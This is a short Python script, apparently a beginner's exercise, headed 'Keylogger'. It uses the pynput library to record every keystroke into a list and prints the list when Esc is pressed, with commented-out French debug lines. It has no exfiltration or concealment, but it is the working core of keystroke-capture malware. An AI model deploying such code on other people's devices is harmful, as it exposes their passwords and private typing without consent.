################# Keylogger ##################

from pynput import keyboard

keys = []
def on_press(key):
    keys.append(key)
    '''try:
        print(f'bouton presse:{key.char}')
    except AttributeError:
        print(f'bouton presse:{key}')'''

def on_release(key):
    #print("bouton relache:", key)
    if key == keyboard.Key.esc:
        print(keys)
        return False  # stop listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()